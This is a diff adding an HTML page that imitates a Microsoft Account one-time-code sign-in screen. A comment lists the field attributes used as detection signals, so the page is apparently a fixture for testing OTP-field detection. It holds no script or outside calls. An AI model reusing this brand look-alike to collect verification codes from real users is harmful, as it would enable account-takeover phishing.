@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Enter code - Microsoft Account</title>
+</head>
+<body>
+    <div class="outer">
+        <div class="middle">
+            <div class="inner">
+                <div class="win-screen">
+                    <div class="win-scroll">
+                        <div class="title">
+                            <h1>Enter code</h1>
+                        </div>
+                        <div class="content">
+                            <p>We sent a code to ***@outlook.com. Enter it here to sign in.</p>
+                            <form id="idForm" method="POST" action="/kmsi">
+                                <div class="form-group">
+                                    <!-- Detection signals: autocomplete="one-time-code", inputmode="numeric", name="otc" -->
+                                    <label for="idTxtBx_OTC_Password">Enter the code</label>
+                                    <input
+                                        type="tel"
+                                        id="idTxtBx_OTC_Password"
+                                        name="otc"
+                                        class="form-control"
+                                        autocomplete="one-time-code"
+                                        inputmode="numeric"
+                                        maxlength="6"
+                                        required
+                                        aria-describedby="idDiv_OTC_Description"
+                                    >
+                                    <div id="idDiv_OTC_Description" class="form-hint">
+                                        This helps us keep your account secure
+                                    </div>
+                                </div>
+                                <div class="win-button-pin-bottom">
+                                    <button type="submit" class="win-button win-button-primary">Verify</button>
+                                </div>
+                            </form>
+                            <div class="footer-links">
+                                <a href="#">I didn't receive a code</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
